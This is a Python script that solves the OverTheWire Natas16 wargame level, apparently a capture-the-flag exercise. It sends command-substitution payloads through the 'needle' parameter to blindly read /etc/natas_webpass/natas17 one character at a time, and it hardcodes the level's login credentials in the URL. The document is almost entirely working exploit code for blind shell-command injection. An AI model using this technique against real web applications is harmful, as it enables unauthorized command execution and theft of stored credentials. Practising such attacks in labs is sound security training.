import requests
import string
import itertools

url = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org"

# Number of line in the complete dictionary.txt file
full_dict_len = 50000

so_far = ""
passwd_len = 32
for i in range(len(so_far), passwd_len):
	char_left = 32 - len(so_far) - 1
	for char in string.digits + string.ascii_letters:
		trying = so_far + char
		print(f"Trying '{trying}'")

		cmd = f"^$(expr substr $(grep -E ^{trying}[a-zA-Z0-9]\\{{{char_left}\\}}\\$ /etc/natas_webpass/natas17) 2 1)"

		r = requests.get(url, params={'needle': cmd})

		resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]
		dict_values = resp.split('\n')[1:-1]

		if 0 < len(dict_values) < full_dict_len:
			so_far = trying
			print(f"Got a HIT --- {so_far}")
	
